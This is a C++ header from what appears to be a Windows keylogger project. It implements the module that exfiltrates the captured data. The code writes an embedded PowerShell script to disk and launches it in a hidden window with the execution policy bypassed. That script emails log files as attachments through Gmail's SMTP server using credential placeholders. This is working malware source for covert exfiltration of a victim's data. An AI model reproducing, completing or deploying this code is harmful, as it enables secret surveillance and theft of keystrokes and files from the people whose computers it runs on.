/*
Used for sending emails. 
The Powershell script will create a file that will generate a powershell string.
The script in then invoked in order to send you an email of the log file.
*/

#ifndef SENDMAIL_H
#define SENDMAIL_H
#define SCRIPT_NAME "powershellScript.ps1"

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

using namespace std;

namespace Mail
{
//Edit sender/receiver information
#define X_EM_TO "EMAIL TO SEND LOGS TO"
#define X_EM_FROM "EMAIL TO SEND LOGS FROM"
#define X_EM_PASS "EMAIL PASSWORD"

	//Power Shell script
	const string &PowerShellScript =
		"Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
		" something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(X_EM_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(X_EM_PASS) +
		"\""
		" -From \"" +
		std::string(X_EM_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; #well, calling the function is wrong? not enough parameters\r\n    }";

#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

	string StringReplace(string stringToReplace, const string &what, const string &with)
	{
		//if pattern not found
		if (what.empty()) { return stringToReplace; }			

		//iterating through the string one position at a time
		size_t sp = 0;
		while ((sp = stringToReplace.find(what, sp)) != string::npos)
		{
			stringToReplace.replace(sp, what.length(), with), sp += with.length();
		}

		return stringToReplace;
	}

	//Check if File exists
	bool CheckFileExists(const string &f)
	{
		ifstream file(f);
		return (bool)file;
	}

	//Function needed to create a powershell script
	bool CreateScript()
	{
		ofstream script(IO::GetOurPath(true) + string(SCRIPT_NAME));

		if (!script) { return false; }

		script << PowerShellScript;
		
		if (!script) { return false; }

		script.close();
		return true;
	}

	//Using global variable timer
	Timer m_timer;

	//Function to send the email
	//There is a subject, the body and the attachement
	int SendMail(const std::string &subject, const string &body, const string &attachments)
	{
		bool directoryExists = IO::MkDir(IO::GetOurPath(true));
		
		if (!directoryExists) { return -1; }

		//Check if file exists
		string scr_path = IO::GetOurPath(true) + string(SCRIPT_NAME);
		if (!CheckFileExists(scr_path))
		{
			directoryExists = CreateScript();
		}

		if (!directoryExists) { return -2;  }

		//requires admin control to proceeds
		//param script that can be passed into power shell and give you admin control
		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
							+ StringReplace(subject, "\"", "\\\"") +
							"\" -Body \""
							+ StringReplace(body, "\"", "\\\"") +
							"\" -Att \"" + attachments + "\"";

		//Windows API functions
		//Used for the execution of power shell
		LPCWSTR open = TEXT("open");
		LPCWSTR powershell = TEXT("powershell");
		std::wstring stemp = std::wstring(param.begin(), param.end());
		LPCWSTR sw = stemp.c_str();

		SHELLEXECUTEINFO ShExecInfo = { 0 };
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		//window's tab
		ShExecInfo.hwnd = NULL;
		//right click open
		ShExecInfo.lpVerb = open;
		ShExecInfo.lpFile = powershell;
		//Sends in the parameter string 
		//FIX THIS
		ShExecInfo.lpParameters = sw;
		ShExecInfo.lpDirectory = NULL;
		//Hid powershell window
		ShExecInfo.nShow = SW_HIDE;
		ShExecInfo.hInstApp = NULL;

		directoryExists = (bool)ShellExecuteEx(&ShExecInfo);

		if (!directoryExists) { return -3; }		

		//DWORD -> windows API
		WaitForSingleObject(ShExecInfo.hProcess, 7000);
		DWORD exit_code = 100;
		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

		//Uses a lambda function
		m_timer.SetFunction([&]()
		{
			WaitForSingleObject(ShExecInfo.hProcess, 60000);
			//exit_code compare to 259 
			//Still_Active(259) is a wondows API function,  if it is returned,  
			//it means that the thread is still running and continue to test for the 
			//completion of the thread after the thread has terminated
			//in this case we will terminate it once done with it
			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
			if ((int)exit_code == STILL_ACTIVE)
			{
				TerminateProcess(ShExecInfo.hProcess, 100);
			}
			Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
		});

		m_timer.RepeatCount(1L);
		m_timer.SetInterval(10L);
		m_timer.Start(true);
		return (int)exit_code;
	}

	//Overload the function Send Mail
	//in order to send as many attachements as we want
	int SendMail(const string &subject, const string &body, const vector< string> &att)
	{
		string attachments = std::string();

		if (att.size() == 1U)
		{
			attachments = att.at(0);
		}
		else 
		{
			for (const auto &v : att)
			{
				attachments += v + "::";
			}
			attachments = attachments.substr(0, attachments.length() - 2);
		}
		return SendMail(subject, body, attachments);
	}
}
#endif
